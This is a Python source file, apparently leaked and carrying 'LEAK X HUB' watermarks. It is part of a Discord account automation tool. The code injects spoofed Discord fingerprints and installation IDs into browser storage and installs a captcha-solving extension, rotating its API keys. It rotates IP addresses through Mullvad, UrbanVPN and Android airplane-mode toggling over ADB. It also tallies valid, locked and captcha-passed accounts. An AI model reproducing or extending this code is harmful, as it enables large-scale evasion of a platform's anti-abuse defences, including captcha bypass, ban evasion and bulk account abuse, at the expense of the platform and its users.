import asyncio
from datetime import datetime
import hashlib
import os
import shutil
from pathlib import Path
import platform
import re
import sys
import threading
import time
import json
import random
import string
import signal
import tempfile
from typing import Optional, Dict, List, Any
import requests
import httpx
import tls_client
from colorama import Fore, Style, init
from pystyle import Center
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich.table import Table
from rich.text import Text
from collections import deque
import warnings
import nodriver as uc
from nodriver import cdp
import urllib3
import base64
import logging
import imaplib
import email as email_module
from email.header import decode_header
import psutil

import asyncio
import os
from playwright.async_api import async_playwright


async def main():
    # Detect system Chromium binary path or use Playwright's default
    chrome_path = os.getenv("CHROME_BIN", "/usr/bin/chromium")

    async with async_playwright() as p:
        try:
            # Try launching via explicit path
            browser = await p.chromium.launch(
                executable_path=chrome_path, headless=True
            )
        except Exception:
            # Fallback to Playwright default binary
            browser = await p.chromium.launch(headless=True)

        page = await browser.new_page()
        await page.goto("https://example.com")
        print("Successfully loaded page title:", await page.title())

        await browser.close()


if __name__ == "__main__":
    asyncio.run(main())




 # adjust to your installed binary location

# Example if using Pyppeteer / Playwright / Selenium:
# browser = await launch(executablePath=chrome_path)

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================
# @WATERMARK BY LEAK X HUB
# discord.gg/leakx
# ============================================================

# ===== CLEAR TERMINAL ON START =====
os.system('cls' if os.name == 'nt' else 'clear')

# ===== SILENCE UGLY SSL WARNINGS =====
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore')
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)

def get_brave_path() -> Optional[str]:
    candidates = []

    env_path = os.environ.get("BRAVE_PATH") or os.environ.get("CHROME_PATH")
    if env_path:
        candidates.append(env_path)

    if sys.platform == "win32":
        candidates.extend([
            r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
            r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
            os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\Application\brave.exe"),
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        ])
    elif sys.platform == "darwin":
        candidates.extend([
            "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser",
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        ])
    else:
        candidates.extend([
            "/usr/bin/brave-browser",
            "/usr/bin/brave",
            "/snap/bin/brave",
            "/usr/bin/google-chrome",
            "/usr/bin/google-chrome-stable",
        ])

    for candidate in candidates:
        if candidate and os.path.exists(candidate):
            return candidate

    for binary in ["brave", "brave-browser", "google-chrome", "google-chrome-stable", "chrome"]:
        resolved = shutil.which(binary)
        if resolved:
            return resolved

    return None


BRAVE_PATH = get_brave_path()
if not BRAVE_PATH:
    print("\033[93m[WARN]\033[0m Brave/Chrome executable not found; nodriver will use the system default browser")

# ============================================================
# WATERMARK - LEAK X HUB
# @WATERMARK BY LEAK X HUB
# discord.gg/leakx
# ============================================================

# ============================================================================
# CDP KEY SENDER
# ============================================================================

async def _cdp_key(tab, key: str, code: str, keycode: int):
    try:
        await tab.send(
            cdp.input_.dispatch_key_event(
                type_="keyDown", key=key, code=code,
                windows_virtual_key_code=keycode,
                native_virtual_key_code=keycode,
            )
        )
        await asyncio.sleep(0.05)
        await tab.send(
            cdp.input_.dispatch_key_event(
                type_="keyUp", key=key, code=code,
                windows_virtual_key_code=keycode,
                native_virtual_key_code=keycode,
            )
        )
    except Exception:
        pass

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# NOPECHA AUTO-INSTALLER
# ============================================================================

NOPECHA_EXT_DIR = Path(__file__).parent / "nopecha_ext"
NOPECHA_KEYS_FILE = Path(__file__).parent / "nopecha_keys.txt"
NOPECHA_KEY_INDEX = 0
NOPECHA_KEY_LOCK = threading.Lock()

def load_nopecha_keys() -> list:
    if not NOPECHA_KEYS_FILE.exists():
        NOPECHA_KEYS_FILE.write_text(
            "# Add your NopeCHA API keys here, one per line\n"
            "# Get keys from https://nopecha.com/setup\n"
        )
        return []
    keys = []
    for line in NOPECHA_KEYS_FILE.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            keys.append(line)
    return keys

def get_current_nopecha_key() -> Optional[str]:
    try:
        if isinstance(config, dict):
            nopecha_config = config.get("nopecha", {})
            if nopecha_config.get("enabled", False) and nopecha_config.get("api_key"):
                key = nopecha_config.get("api_key")
                if key and key != "YOUR_NOPECHA_API_KEY_HERE":
                    return key
    except Exception:
        pass
    
    keys = load_nopecha_keys()
    if not keys:
        return None
    with NOPECHA_KEY_LOCK:
        return keys[NOPECHA_KEY_INDEX % len(keys)]

def rotate_nopecha_key():
    global NOPECHA_KEY_INDEX
    keys = load_nopecha_keys()
    if keys:
        with NOPECHA_KEY_LOCK:
            NOPECHA_KEY_INDEX = (NOPECHA_KEY_INDEX + 1) % len(keys)

def inject_nopecha_key(api_key: str) -> bool:
    if not api_key or not NOPECHA_EXT_DIR.exists():
        return False
    
    try:
        manifest_path = NOPECHA_EXT_DIR / "manifest.json"
        if manifest_path.exists():
            with open(manifest_path, 'r') as f:
                manifest = json.load(f)
            if 'nopecha' not in manifest:
                manifest['nopecha'] = {}
            manifest['nopecha']['key'] = api_key
            with open(manifest_path, 'w') as f:
                json.dump(manifest, f, indent=2)
        
        storage_init_path = NOPECHA_EXT_DIR / "storage_init.js"
        storage_init_code = f"""
(function() {{
  const nopecha_api_key = '{api_key}';
  chrome.storage.local.set({{'nopecha_key': nopecha_api_key}}, function() {{
    console.log('[NopeCHA Storage] API Key initialized');
  }});
}})();
"""
        with open(storage_init_path, 'w') as f:
            f.write(storage_init_code)
        
        config_path = NOPECHA_EXT_DIR / "nopecha_config.json"
        config_data = {
            'api_key': api_key,
            'enabled': True,
            'timestamp': datetime.now().isoformat()
        }
        with open(config_path, 'w') as f:
            json.dump(config_data, f, indent=2)
        
        return True
    except Exception as e:
        log.warning(f"Inject failed: {e}")
        return False

def download_nopecha_ext() -> Optional[Path]:
    if NOPECHA_EXT_DIR.exists() and (NOPECHA_EXT_DIR / "manifest.json").exists():
        return NOPECHA_EXT_DIR
    import zipfile, io
    zip_url = "https://github.com/NopeCHALLC/nopecha-extension/releases/latest/download/chromium_automation.zip"
    try:
        r = requests.get(zip_url, timeout=60, headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code != 200:
            log.warning(f"NopeCHA download failed: HTTP {r.status_code}")
            return None
        NOPECHA_EXT_DIR.mkdir(exist_ok=True)
        with zipfile.ZipFile(io.BytesIO(r.content)) as z:
            z.extractall(NOPECHA_EXT_DIR)
        log.success("NopeCHA extension downloaded!")
        return NOPECHA_EXT_DIR
    except Exception as e:
        log.warning(f"NopeCHA download error: {e}")
        return None

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# FINGERPRINTS HANDLER
# ============================================================================

FINGERPRINTS_FILE = Path(__file__).parent / "input/fingerprints.txt"
FINGERPRINTS_INDEX = 0
FINGERPRINTS_LOCK = threading.Lock()
RESERVED_FINGERPRINTS = set()

def load_fingerprints() -> list:
    if not FINGERPRINTS_FILE.exists():
        FINGERPRINTS_FILE.write_text(
            "# Add your fingerprints here, one per line\n"
            "# Each fingerprint will be assigned to one account\n"
        )
        return []
    fingerprints = []
    for line in FINGERPRINTS_FILE.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            fingerprints.append(line)
    return fingerprints

def parse_fingerprint_line(line: str) -> Dict:
    if not line:
        return {}
    line = line.strip()
    if not line:
        return {}
    try:
        data = json.loads(line)
        if isinstance(data, dict):
            fingerprint = data.get('fingerprint') or data.get('metadata', {}).get('fingerprint')
            if fingerprint:
                data['fingerprint'] = fingerprint
            return data
    except json.JSONDecodeError:
        pass
    return {
        'fingerprint': line,
        'metadata': {
            'fingerprint': line
        }
    }


def get_fingerprint_value(fingerprint_line: str) -> Optional[str]:
    data = parse_fingerprint_line(fingerprint_line)
    return data.get('fingerprint')


def get_fingerprint_installation_id(fingerprint_line: str) -> Optional[str]:
    data = parse_fingerprint_line(fingerprint_line)
    installation = data.get('installation') or data.get('metadata', {}).get('installation')
    return installation


def get_current_fingerprint() -> Optional[str]:
    fingerprints = load_fingerprints()
    if not fingerprints:
        return None
    with FINGERPRINTS_LOCK:
        return fingerprints[FINGERPRINTS_INDEX % len(fingerprints)]

def reserve_fingerprint() -> Optional[str]:
    with FINGERPRINTS_LOCK:
        fingerprints = [f for f in load_fingerprints() if f not in RESERVED_FINGERPRINTS]
        if not fingerprints:
            return None
        fingerprint = fingerprints[0]
        RESERVED_FINGERPRINTS.add(fingerprint)
        return fingerprint

def release_fingerprint(fingerprint: str):
    if not fingerprint:
        return
    with FINGERPRINTS_LOCK:
        RESERVED_FINGERPRINTS.discard(fingerprint)

def consume_fingerprint(fingerprint: str):
    if not fingerprint:
        return
    with FINGERPRINTS_LOCK:
        lines = []
        for line in FINGERPRINTS_FILE.read_text().splitlines():
            stripped = line.strip()
            if stripped and not stripped.startswith('#') and stripped != fingerprint:
                lines.append(line)
        FINGERPRINTS_FILE.write_text("\n".join(lines) + ("\n" if lines else ""))
        RESERVED_FINGERPRINTS.discard(fingerprint)

def rotate_fingerprint():
    global FINGERPRINTS_INDEX
    fingerprints = load_fingerprints()
    if fingerprints:
        with FINGERPRINTS_LOCK:
            FINGERPRINTS_INDEX = (FINGERPRINTS_INDEX + 1) % len(fingerprints)

def get_fingerprint_installation_number(fingerprint: str) -> Optional[int]:
    if not fingerprint:
        return None
    fingerprints = load_fingerprints()
    for idx, fp in enumerate(fingerprints, start=1):
        if fp == fingerprint:
            return idx
    return None


async def inject_fingerprint_to_page(page, fingerprint_line: str) -> bool:
    data = parse_fingerprint_line(fingerprint_line)
    fingerprint_value = data.get('fingerprint')
    if not fingerprint_value:
        return False
    installation_value = data.get('installation') or data.get('metadata', {}).get('installation')
    json_data = json.dumps(data)
    js = f'''
    (() => {{
        try {{
            window.__discord_fp_data = {json_data};
            window.localStorage.setItem('discord_fp_data', JSON.stringify({json_data}));
            window.localStorage.setItem('discord_fingerprint', {json.dumps(fingerprint_value)});
            if ({json.dumps(bool(installation_value))}) {{
                window.localStorage.setItem('discord_installation_id', {json.dumps(installation_value)});
            }}
            return true;
        }} catch (e) {{
            return false;
        }}
    }})();
    '''
    try:
        return await page.evaluate(js)
    except Exception:
        return False

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# MULLVAD VPN HANDLER
# ============================================================================

import subprocess
import psutil

MULLVAD_STATS = {
    'total_rotations': 0,
    'failed_rotations': 0,
    'ip_changes': 0,
    'last_ip': None,
    'last_rotation_time': None,
}

URBANVPN_STATS = {
    'total_rotations': 0,
    'failed_rotations': 0,
    'last_ip': None,
    'last_rotation_time': None,
}

URBANVPN_BINARY = 'urbanvpn'
URBANVPN_AVAILABLE = False

ACCOUNT_STATS = {
    'valid': 0,
    'invalid': 0,
    'locked': 0,
    'verified': 0,
    'captcha_ok': 0,
    'captcha_fail': 0,
    'phone': 0,
}
ACCOUNT_STATS_LOCK = threading.Lock()

NETWORK_STATS = {
    'last_bytes_sent': 0,
    'last_bytes_recv': 0,
    'last_check_time': time.time(),
    'upload_mbps': 0.0,
    'download_mbps': 0.0,
}
NETWORK_STATS_LOCK = threading.Lock()

def get_network_stats() -> dict:
    try:
        with NETWORK_STATS_LOCK:
            current_time = time.time()
            net_io = psutil.net_io_counters()
            time_diff = max(current_time - NETWORK_STATS['last_check_time'], 0.1)
            
            bytes_sent_diff = max(net_io.bytes_sent - NETWORK_STATS['last_bytes_sent'], 0)
            bytes_recv_diff = max(net_io.bytes_recv - NETWORK_STATS['last_bytes_recv'], 0)
            
            upload_mbps = (bytes_sent_diff / time_diff) * 8 / 1_000_000
            download_mbps = (bytes_recv_diff / time_diff) * 8 / 1_000_000
            
            NETWORK_STATS['last_bytes_sent'] = net_io.bytes_sent
            NETWORK_STATS['last_bytes_recv'] = net_io.bytes_recv
            NETWORK_STATS['last_check_time'] = current_time
            NETWORK_STATS['upload_mbps'] = upload_mbps
            NETWORK_STATS['download_mbps'] = download_mbps
            
            return NETWORK_STATS.copy()
    except Exception:
        return NETWORK_STATS.copy()

def check_mullvad_installed() -> bool:
    try:
        result = subprocess.run(
            ['mullvad', 'version'],
            capture_output=True, text=True, timeout=10
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False

def mullvad_kill_stuck_process(timeout: int = 30):
    try:
        for proc in psutil.process_iter(['pid', 'name', 'create_time']):
            try:
                if 'mullvad' in proc.info['name'].lower():
                    runtime = time.time() - proc.info['create_time']
                    if runtime > timeout:
                        proc.kill()
                        log.warning(f"Killed stuck mullvad process (PID: {proc.pid})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception:
        pass

def mullvad_status(timeout: int = 10) -> str:
    try:
        result = subprocess.run(
            ['mullvad', 'status'],
            capture_output=True, text=True, timeout=timeout
        )
        status = result.stdout.strip()
        status = re.sub(r'Visible location:[^\r\n]*', '', status, flags=re.IGNORECASE)
        status = re.sub(r'IPv4:[^\r\n]*', '', status, flags=re.IGNORECASE)
        status = re.sub(r'\s{2,}', ' ', status).strip()
        return status
    except subprocess.TimeoutExpired:
        log.warning("mullvad status command timed out")
        mullvad_kill_stuck_process()
        return "timeout"
    except Exception:
        return "unknown"

def mullvad_disconnect(timeout: int = 15, max_attempts: int = 15):
    try:
        subprocess.run(
            ['mullvad', 'disconnect'],
            capture_output=True, text=True, timeout=10
        )
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < timeout and attempts < max_attempts:
            status = mullvad_status(timeout=5)
            if "Disconnected" in status:
                return
            time.sleep(0.5)
            attempts += 1
        
        if attempts >= max_attempts:
            log.warning(f"Disconnect verification timed out after {attempts} attempts")
    except Exception as e:
        log.warning(f"Mullvad disconnect error: {e}")
        mullvad_kill_stuck_process()

def mullvad_connect(country: str = "us", timeout: int = 30, max_attempts: int = 30) -> bool:
    try:
        result = subprocess.run(
            ['mullvad', 'relay', 'set', 'location', country],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            log.warning(f"Failed to set Mullvad location to {country}")
            return False

        subprocess.run(
            ['mullvad', 'relay', 'set', 'tunnel-protocol', 'wireguard'],
            capture_output=True, text=True, timeout=10
        )

        subprocess.run(
            ['mullvad', 'connect'],
            capture_output=True, text=True, timeout=10
        )

        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < timeout and attempts < max_attempts:
            status = mullvad_status(timeout=5)
            
            if "Connected" in status:
                return True
            
            if "Connecting" in status:
                wait_time = 0.5 if attempts < 5 else 1.0
                time.sleep(wait_time)
            else:
                log.debug(f"Mullvad status: {status}")
                time.sleep(1)
            
            attempts += 1
        
        final_status = mullvad_status(timeout=5)
        log.error(f"Mullvad connection timeout. Final status: {final_status}")
        return False
        
    except subprocess.TimeoutExpired as e:
        log.error(f"Mullvad command timed out: {e}")
        mullvad_kill_stuck_process()
        return False
    except Exception as e:
        log.error(f"Mullvad connect error: {e}")
        return False

def mullvad_get_ip(timeout: int = 15, attempts: int = 3) -> Optional[str]:
    providers = [
        ('https://am.i.mullvad.net/json', 'ip'),
        ('https://api.ipify.org?format=json', 'ip'),
        ('https://ifconfig.me/all.json', 'ip_addr'),
    ]
    
    for attempt in range(attempts):
        for url, key in providers:
            try:
                resp = requests.get(url, timeout=timeout)
                if resp.status_code == 200:
                    data = resp.json()
                    ip = data.get(key, data.get('ip', None))
                    if ip:
                        return ip
            except Exception:
                continue
        
        if attempt < attempts - 1:
            time.sleep(1)
    
    return None


def load_mullvad_accounts() -> list:
    account_file = config.get("mullvad", {}).get("account_file", "input/mullvad_accounts.txt")
    account_path = Path(account_file)
    if not account_path.is_absolute():
        account_path = Path(__file__).parent / account_path

    if not account_path.exists():
        account_path.parent.mkdir(parents=True, exist_ok=True)
        account_path.write_text(
            "# Add your Mullvad account numbers here, one per line\n"
            "# The most recent account should be last\n"
        )
        return []

    accounts = []
    for line in account_path.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            accounts.append(line)
    return accounts


def get_recent_mullvad_account() -> Optional[str]:
    account_number = config.get("mullvad", {}).get("account_number", "")
    if isinstance(account_number, str) and account_number.strip():
        return account_number.strip()

    accounts = load_mullvad_accounts()
    if not accounts:
        return None
    return accounts[-1]


def mullvad_account_status(timeout: int = 10) -> str:
    try:
        result = subprocess.run(
            ['mullvad', 'account', 'status'],
            capture_output=True, text=True, timeout=timeout
        )
        if result.returncode != 0:
            return (result.stderr or result.stdout or '').strip()
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        return "timeout"
    except Exception:
        return ""


def is_mullvad_device_revoked(status: str) -> bool:
    if not status:
        return False
    lowered = status.lower()
    revoked_keywords = ['revoked', 'revocation', 'expired', 'inactive', 'deactivated', 'invalid device', 'device revoked', 'device disabled']
    return any(keyword in lowered for keyword in revoked_keywords)


def mullvad_account_login(account: str, timeout: int = 30) -> bool:
    try:
        result = subprocess.run(
            ['mullvad', 'account', 'login', account],
            capture_output=True, text=True, timeout=timeout
        )
        if result.returncode == 0:
            return True
        return False
    except subprocess.TimeoutExpired:
        return False
    except Exception:
        return False


def mullvad_auto_login_recent_account() -> bool:
    account = get_recent_mullvad_account()
    if not account:
        log.warning("No Mullvad account configured for auto-login")
        return True

    status = mullvad_account_status()
    if is_mullvad_device_revoked(status):
        log.warning("Mullvad device has been revoked; attempting auto-login...")
        if mullvad_account_login(account):
            return True
        else:
            log.error("Mullvad auto-login failed after device revocation")
            return False

    return True


def mullvad_rotate(country: str = "us", max_retries: int = 3, min_rotation_delay: int = 2) -> bool:
    MULLVAD_STATS['total_rotations'] += 1
    
    if MULLVAD_STATS['last_rotation_time']:
        elapsed = time.time() - MULLVAD_STATS['last_rotation_time']
        if elapsed < min_rotation_delay:
            time.sleep(min_rotation_delay - elapsed)
    
    old_ip = MULLVAD_STATS['last_ip']
    
    for attempt in range(max_retries):
        try:
            mullvad_disconnect(timeout=15)
            time.sleep(1)
            
            if not mullvad_connect(country, timeout=30):
                if config.get("mullvad", {}).get("auto_login", False):
                    status = mullvad_account_status()
                    if is_mullvad_device_revoked(status):
                        log.warning("Detected revoked Mullvad device during rotation; attempting auto-login...")
                        if mullvad_auto_login_recent_account():
                            time.sleep(1)
                            continue
                        else:
                            log.error("Mullvad auto-login failed after revoked device detection")
                            MULLVAD_STATS['failed_rotations'] += 1
                            return False

                if attempt < max_retries - 1:
                    log.warning(f"Rotation attempt {attempt + 1}/{max_retries} failed, retrying...")
                    time.sleep(2 ** attempt)
                    continue
                else:
                    log.error("Mullvad rotation failed after all retries")
                    MULLVAD_STATS['failed_rotations'] += 1
                    return False
            
            time.sleep(1)
            new_ip = mullvad_get_ip(timeout=15)
            
            if new_ip:
                MULLVAD_STATS['last_ip'] = new_ip
                MULLVAD_STATS['last_rotation_time'] = time.time()
                
                if old_ip and new_ip == old_ip:
                    log.warning(f"IP did not change: {log.mask_ip(new_ip)} (retry {attempt + 1}/{max_retries})")
                    if attempt < max_retries - 1:
                        time.sleep(2 ** attempt)
                        mullvad_disconnect()
                        continue
                    else:
                        MULLVAD_STATS['failed_rotations'] += 1
                        return False
                else:
                    if old_ip and new_ip != old_ip:
                        log.white(f"IP rotated: {log.mask_ip(old_ip)} -> {log.mask_ip(new_ip)}")
                    else:
                        log.white(f"IP: {log.mask_ip(new_ip)}")
                    MULLVAD_STATS['ip_changes'] += 1
                    return True
            else:
                log.warning(f"Could not verify IP (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(2 ** attempt)
                    continue
                else:
                    MULLVAD_STATS['failed_rotations'] += 1
                    return False
        
        except Exception as e:
            log.error(f"Rotation error: {e}")
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)
            else:
                MULLVAD_STATS['failed_rotations'] += 1
                return False
    
    return False

def find_urbanvpn_binary() -> Optional[str]:
    try:
        urbanvpn_config = config.get('urbanvpn', {})
        urbanvpn_path = urbanvpn_config.get('path')
        if urbanvpn_path:
            if os.path.isfile(urbanvpn_path):
                return urbanvpn_path
            if os.path.isdir(urbanvpn_path):
                candidates = ['urbanvpn.exe', 'urban-vpn.exe', 'urbanvpn-cli.exe', 'urbanvpn', 'urban-vpn', 'urbanvpn-cli']
                for candidate in candidates:
                    candidate_path = os.path.join(urbanvpn_path, candidate)
                    if os.path.isfile(candidate_path):
                        return candidate_path
                bin_dir = os.path.join(urbanvpn_path, 'bin')
                if os.path.isdir(bin_dir):
                    for candidate in candidates:
                        candidate_path = os.path.join(bin_dir, candidate)
                        if os.path.isfile(candidate_path):
                            return candidate_path
    except Exception:
        pass

    for candidate in ['urbanvpn', 'urban-vpn', 'urbanvpn-cli']:
        try:
            which = shutil.which(candidate)
            if which:
                return which
        except Exception:
            pass

    return None


def check_urbanvpn_installed() -> bool:
    try:
        global URBANVPN_BINARY
        found = find_urbanvpn_binary()
        if not found:
            return False
        URBANVPN_BINARY = found
        result = subprocess.run(
            [URBANVPN_BINARY, 'version'],
            capture_output=True, text=True, timeout=10
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False
    except Exception:
        return False


def urbanvpn_status(timeout: int = 10) -> str:
    try:
        result = subprocess.run(
            [URBANVPN_BINARY, 'status'],
            capture_output=True, text=True, timeout=timeout
        )
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        log.warning('UrbanVPN status command timed out')
        return 'timeout'
    except Exception:
        return 'unknown'


def urbanvpn_disconnect(timeout: int = 15, max_attempts: int = 15) -> bool:
    try:
        subprocess.run(
            [URBANVPN_BINARY, 'disconnect'],
            capture_output=True, text=True, timeout=10
        )
        start_time = time.time()
        attempts = 0
        while time.time() - start_time < timeout and attempts < max_attempts:
            status = urbanvpn_status(timeout=5)
            if 'Disconnected' in status or 'disconnected' in status:
                return True
            time.sleep(0.5)
            attempts += 1
        if attempts >= max_attempts:
            log.warning(f'UrbanVPN disconnect verification timed out after {attempts} attempts')
        return False
    except Exception as e:
        log.warning(f'UrbanVPN disconnect error: {e}')
        return False


def urbanvpn_connect(server: str = 'us', timeout: int = 30, max_attempts: int = 30) -> bool:
    try:
        connect_cmds = [
            [URBANVPN_BINARY, 'connect', server],
            [URBANVPN_BINARY, 'connect', '--server', server],
            [URBANVPN_BINARY, 'connect', '--country', server],
        ]
        for cmd in connect_cmds:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            if result.returncode == 0:
                break
        else:
            log.warning(f'UrbanVPN failed to connect with server {server}')
            return False

        start_time = time.time()
        attempts = 0
        while time.time() - start_time < timeout and attempts < max_attempts:
            status = urbanvpn_status(timeout=5)
            if 'Connected' in status or 'connected' in status:
                return True
            time.sleep(1)
            attempts += 1
        final_status = urbanvpn_status(timeout=5)
        log.warning(f'UrbanVPN connect timeout. Final status: {final_status}')
        return False
    except subprocess.TimeoutExpired as e:
        log.warning(f'UrbanVPN command timed out: {e}')
        return False
    except Exception as e:
        log.warning(f'UrbanVPN connect error: {e}')
        return False


def urbanvpn_rotate(server: str = 'us', max_retries: int = 3, min_rotation_delay: int = 2) -> bool:
    URBANVPN_STATS['total_rotations'] += 1
    if URBANVPN_STATS['last_rotation_time']:
        elapsed = time.time() - URBANVPN_STATS['last_rotation_time']
        if elapsed < min_rotation_delay:
            time.sleep(min_rotation_delay - elapsed)
    old_ip = URBANVPN_STATS['last_ip']
    for attempt in range(max_retries):
        if not urbanvpn_disconnect():
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)
                continue
            URBANVPN_STATS['failed_rotations'] += 1
            return False
        time.sleep(1)
        if not urbanvpn_connect(server, timeout=30):
            if attempt < max_retries - 1:
                log.warning(f'UrbanVPN rotation attempt {attempt + 1}/{max_retries} failed, retrying...')
                time.sleep(2 ** attempt)
                continue
            URBANVPN_STATS['failed_rotations'] += 1
            return False
        time.sleep(2)
        new_ip = get_public_ip()
        if new_ip:
            URBANVPN_STATS['last_ip'] = new_ip
            URBANVPN_STATS['last_rotation_time'] = time.time()
            if old_ip and new_ip == old_ip:
                log.warning(f'UrbanVPN IP did not change: {log.mask_ip(new_ip)} (retry {attempt + 1}/{max_retries})')
                if attempt < max_retries - 1:
                    time.sleep(2 ** attempt)
                    continue
                URBANVPN_STATS['failed_rotations'] += 1
                return False
            else:
                if old_ip:
                    log.success(f'UrbanVPN IP rotated: {log.mask_ip(old_ip)} -> {log.mask_ip(new_ip)}')
                else:
                    log.success(f'UrbanVPN connected - IP: {log.mask_ip(new_ip)}')
                return True
        else:
            log.warning(f'UrbanVPN could not verify IP (attempt {attempt + 1}/{max_retries})')
            if attempt < max_retries - 1:
                continue
            URBANVPN_STATS['failed_rotations'] += 1
            return False
    return False

MULLVAD_AVAILABLE = False

def get_mullvad_stats() -> dict:
    stats = MULLVAD_STATS.copy()
    if stats['total_rotations'] > 0:
        stats['success_rate'] = f"{((stats['total_rotations'] - stats['failed_rotations']) / stats['total_rotations'] * 100):.1f}%"
    return stats

def get_account_stats() -> dict:
    with ACCOUNT_STATS_LOCK:
        stats = ACCOUNT_STATS.copy()
    total = stats['valid'] + stats['invalid'] + stats['locked']
    if total > 0:
        stats['valid_percent'] = f"{(stats['valid'] / total * 100):.1f}%"
        stats['total'] = total
    else:
        stats['valid_percent'] = "0.0%"
        stats['total'] = 0
    return stats

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# ADB (ANDROID DEBUG BRIDGE) HANDLER
# ============================================================================

ADB_ENABLED = False
ADB_DEVICE = None
ADB_BINARY = 'adb'
ADB_LAST_IP = None
ADB_HOST = None
ADB_PORT = None

def get_public_ip(timeout: int = 8) -> Optional[str]:
    try:
        resp = requests.get('https://api.ipify.org?format=text', timeout=timeout)
        if resp.status_code == 200:
            ip = resp.text.strip()
            if re.match(r"^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$", ip):
                return ip
            return ip
    except Exception:
        return None
    return None

def find_adb_binary() -> Optional[str]:
    try:
        adb_config = config.get('adb', {})
        adb_path = adb_config.get('path')
        if adb_path and os.path.exists(adb_path):
            return adb_path
    except Exception:
        pass

    try:
        which = shutil.which('adb')
        if which:
            return which
    except Exception:
        pass

    candidates = [
        r"C:\LDPlayer\LDPlayer9\adb.exe",
        r"C:\LDPlayer\LDPlayer4\adb.exe",
        r"C:\Program Files\LDPlayer\adb.exe",
        r"C:\Program Files\ldplayer\adb.exe",
        r"C:\Program Files\ldplayer9\adb.exe",
        r"C:\Program Files (x86)\ldplayer\adb.exe",
    ]
    for p in candidates:
        if os.path.exists(p):
            return p
    return None

def adb_connect_remote(host: str, port: int) -> Optional[str]:
    try:
        proc = subprocess.run(
            [ADB_BINARY, 'connect', f"{host}:{port}"],
            capture_output=True, text=True, timeout=15
        )
        output = proc.stdout.strip() or proc.stderr.strip()
        return output
    except Exception:
        return None


def check_adb_installed() -> bool:
    try:
        global ADB_BINARY
        found = find_adb_binary()
        if not found:
            return False
        ADB_BINARY = found
        result = subprocess.run(
            [ADB_BINARY, 'version'],
            capture_output=True, text=True, timeout=10
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def get_adb_device() -> Optional[str]:
    try:
        global ADB_BINARY
        result = subprocess.run(
            [ADB_BINARY, 'devices'],
            capture_output=True, text=True, timeout=10
        )
        lines = result.stdout.strip().split('\n')
        for line in lines:
            if 'device' in line.lower() and not line.startswith('List') and not line.strip().endswith('unauthorized'):
                device_id = line.split()[0]
                if device_id:
                    return device_id
        return None
    except Exception:
        return None

def adb_shell_command(command: str, device: str = None) -> Optional[str]:
    try:
        global ADB_BINARY
        cmd = f'"{ADB_BINARY}"'
        if device:
            cmd += f' -s {device}'
        cmd += f' shell {command}'
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=45)
        return result.stdout.strip() if result.returncode == 0 else None
    except subprocess.TimeoutExpired:
        log.warning(f"ADB command timed out: {command}")
        return None
    except Exception as e:
        log.warning(f"ADB shell error: {e}")
        return None


def adb_get_public_ip(device: str = None, timeout: int = 15) -> Optional[str]:
    device = device or ADB_DEVICE
    if not device:
        return None

    for cmd in [
        'curl -s https://api.ipify.org',
        'wget -qO- https://api.ipify.org',
        'busybox wget -qO- https://api.ipify.org',
        'toybox wget -qO- https://api.ipify.org',
    ]:
        result = adb_shell_command(cmd, device)
        if result and re.match(r"^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$", result.strip()):
            return result.strip()
    return None


def adb_change_ip(device: str = None, vpn_profile: str = None, wait_time: int = 5) -> bool:
    device = device or ADB_DEVICE
    if not device:
        log.warning("No ADB device found")
        return False

    ip_before = adb_get_public_ip(device)
    if not ip_before:
        log.warning("ADB: Could not fetch IP before rotation")
        return False

    log.info(f"ADB: Current IP: {ip_before}")
    
    log.info("ADB: Attempting airplane-mode toggle...")
    adb_shell_command('settings put global airplane_mode_on 1 && am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true', device)
    time.sleep(8)
    adb_shell_command('settings put global airplane_mode_on 0 && am broadcast -a android.intent.action.AIRPLANE_MODE --ez state false', device)
    
    log.info("ADB: Waiting for network reconnection...")
    time.sleep(wait_time + 3)
    
    ip_after = adb_get_public_ip(device)
    if not ip_after:
        log.warning("ADB: Could not fetch IP after rotation")
        return False
    
    log.info(f"ADB: New IP: {ip_after}")
    
    if ip_after != ip_before:
        log.success(f"ADB: IP rotation successful: {ip_before} -> {ip_after}")
        return True
    else:
        log.warning(f"ADB: IP unchanged after rotation")
        return False

